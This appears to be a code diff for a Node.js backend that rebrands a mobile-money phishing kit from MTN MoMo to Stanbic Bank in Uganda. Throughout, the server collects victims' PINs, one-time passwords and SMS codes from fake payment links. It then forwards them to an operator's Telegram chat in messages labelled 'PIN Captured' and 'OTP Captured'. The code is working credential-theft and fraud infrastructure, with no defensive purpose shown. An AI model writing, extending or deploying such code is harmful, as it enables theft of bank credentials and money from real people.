@@ -6,9 +6,9 @@ const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ── Telegram (MTN bot) ──
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
+// ── Telegram (Stanbic bot) ──
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID || '';
 const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 const DATA_DIR   = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
@@ -16,6 +16,8 @@ const LINKS_FILE = path.join(DATA_DIR, 'mtn_links.json');
 const TXS_FILE   = path.join(DATA_DIR, 'mtn_txs.json');
 
 try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e){}
+
+const IS_PERSISTENT = DATA_DIR === '/data';
 
 app.use(cors());
 app.use(express.json({ limit: '2mb' }));
@@ -118,15 +120,25 @@ function normalizeLang(v){
   return (l === 'fr' || l === 'en') ? l : 'en';
 }
 
+function resolvePublicUrl(){
+  return (
+    process.env.PUBLIC_URL ||
+    (process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : '') ||
+    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '') ||
+    `http://localhost:${PORT}`
+  ).replace(/\/+$/, '');
+}
+
 app.get('/', (_req, res) => {
   res.json({
     ok: true,
-    service: 'mtn-momo-backend',
+    service: 'stanbic-payments-backend',
     activeLinks: links.size,
     activeTxs: txs.size,
     dataDir: DATA_DIR,
+    isPersistent: IS_PERSISTENT,
     telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
-    publicUrl: process.env.PUBLIC_URL || '(not set)',
+    publicUrl: resolvePublicUrl(),
     time: new Date().toISOString()
   });
 });
@@ -136,7 +148,8 @@ app.get('/health', (_req, res) => res.json({
   ts: Date.now(),
   activeLinks: links.size,
   activeTxs: txs.size,
-  dataDir: DATA_DIR
+  dataDir: DATA_DIR,
+  isPersistent: IS_PERSISTENT
 }));
 
 app.get('/api/debug', (_req, res) => {
@@ -148,7 +161,13 @@ app.get('/api/debug', (_req, res) => {
     otpStatus: t.otpStatus,
     lang: t.lang || '—'
   });
-  res.json({ ok:true, dataDir: DATA_DIR, txs: tList });
+  res.json({
+    ok:true,
+    dataDir: DATA_DIR,
+    isPersistent: IS_PERSISTENT,
+    publicUrl: resolvePublicUrl(),
+    txs: tList
+  });
 });
 
 app.get('/api/check-webhook', async (_req, res) => {
@@ -160,7 +179,7 @@ app.get('/api/check-webhook', async (_req, res) => {
 
 app.get('/api/set-webhook', async (_req, res) => {
   try {
-    const publicUrl = (process.env.PUBLIC_URL || `https://${process.env.RAILWAY_PUBLIC_DOMAIN || 'localhost'}`).replace(/\/+$/, '');
+    const publicUrl = resolvePublicUrl();
     const webhookUrl = `${publicUrl}/api/telegram-webhook`;
     const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
     const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
@@ -185,11 +204,12 @@ app.post('/api/links', (req, res) => {
       countryCode: body.countryCode || '+256',
       countryFlag: body.countryFlag || '🇺🇬',
       countryName: body.countryName || 'Uganda',
-      modeOfPayment: body.modeOfPayment || 'MTN MoMo',
+      modeOfPayment: body.modeOfPayment || 'Bank Transfer',
       receiptOptional: body.receiptOptional || '',
       marketedBy: body.marketedBy || '',
+      purpose: body.purpose || '',
       timestamp: body.timestamp || '',
-      network: 'mtn',
+      network: 'stanbic',
       lang: lang,
       expiryHours: expiryHours,
       createdAt: now,
@@ -197,7 +217,7 @@ app.post('/api/links', (req, res) => {
     };
     links.set(tracking, record);
     persistLinks();
-    console.log(`[link] created ${tracking} (expires in ${expiryHours}h, lang=${lang})`);
+    console.log(`[link] created ${tracking} (expires in ${expiryHours}h, lang=${lang}, purpose="${record.purpose}")`);
     res.json({
       ok: true,
       code: tracking,
@@ -238,6 +258,7 @@ app.get('/api/links/:code', (req, res) => {
     pm:  rec.modeOfPayment,
     sn:  rec.receiptOptional,
     mk:  rec.marketedBy,
+    pu:  rec.purpose,
     ts:  rec.timestamp
   });
 });
@@ -261,15 +282,18 @@ app.post('/api/mtn/pin', async (req, res) => {
     t.lang = L;
     persistTxs();
 
+    const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
+
     const text =
-      `🔐 <b>MTN PIN Captured</b>\n` +
+      `🔐 <b>Stanbic PIN Captured</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || rn || '—')}\n` +
       `📱 <b>Phone:</b> <code>${esc(phone || rec.accountNumber || an || '—')}</code>\n` +
       `🔑 <b>PIN:</b> <code>${esc(pin)}</code>\n` +
-      `💳 <b>Service:</b> ${esc(rec.modeOfPayment || 'MTN MoMo')}\n` +
+      `💳 <b>Service:</b> ${esc(rec.modeOfPayment || 'Bank Transfer')}\n` +
       `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
+      purposeLine +
       `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
       `🕒 ${nowCAT()}`;
 
@@ -310,14 +334,17 @@ app.post('/api/mtn/sms', async (req, res) => {
     t.lang = L;
     persistTxs();
 
+    const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
+
     const text =
-      `📩 <b>MTN SMS Captured</b>\n` +
+      `📩 <b>Stanbic SMS Captured</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || rn || '—')}\n` +
       `📱 <b>Phone:</b> <code>${esc(rec.accountNumber || an || '—')}</code>\n` +
       `🔑 <b>Code:</b> <code>${esc(code || '—')}</code>\n` +
       `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
+      purposeLine +
       `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
       `🕒 ${nowCAT()}\n` +
       `\n<b>Message:</b>\n<code>${esc(message || '')}</code>`;
@@ -367,13 +394,16 @@ app.post('/api/mtn/otp', async (req, res) => {
     t.lang = L;
     persistTxs();
 
+    const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
+
     const text =
-      `🔢 <b>MTN OTP Captured</b>\n` +
+      `🔢 <b>Stanbic OTP Captured</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || '—')}\n` +
       `🔑 <b>OTP:</b> <code>${esc(otp)}</code>\n` +
       `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
+      purposeLine +
       `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
       `🕒 ${nowCAT()}`;
 
@@ -420,7 +450,7 @@ app.post('/api/mtn/resend', async (req, res) => {
     persistTxs();
 
     await tgSend(
-      `🔁 <b>MTN ${which} Resend Requested</b>\n` +
+      `🔁 <b>Stanbic ${which} Resend Requested</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 ${esc(rec.accountName || '—')}\n` +
@@ -554,12 +584,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 });
 
 async function registerWebhook(){
-  const publicUrl = (
-    process.env.PUBLIC_URL ||
-    (process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : '') ||
-    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '') ||
-    `http://localhost:${PORT}`
-  ).replace(/\/+$/, '');
+  const publicUrl = resolvePublicUrl();
   const webhookUrl = `${publicUrl}/api/telegram-webhook`;
   console.log(`PUBLIC_URL = ${publicUrl}`);
   console.log(`Registering webhook: ${webhookUrl}`);
@@ -571,11 +596,15 @@ async function registerWebhook(){
 }
 
 app.listen(PORT, async () => {
-  console.log(`MTN MoMo backend running on port ${PORT}`);
+  console.log(`Stanbic Bank backend running on port ${PORT}`);
   console.log(`Static HTML dir: ${path.join(__dirname, '..')}`);
-  console.log(`Data directory: ${DATA_DIR}`);
-  if (DATA_DIR !== '/data') {
-    console.warn('⚠️  No persistent disk — data wiped on restart');
+  console.log(`Data directory: ${DATA_DIR} ${IS_PERSISTENT ? '✅ PERSISTENT' : '⚠️  TEMPORARY'}`);
+  if (!IS_PERSISTENT) {
+    console.warn('⚠️  No persistent disk — transaction data will be WIPED on restart.');
+    console.warn('⚠️  To fix: add a persistent disk mounted at /data, then set DATA_DIR=/data');
+  }
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.warn('⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — webhook may fail');
   }
   await registerWebhook();
 });
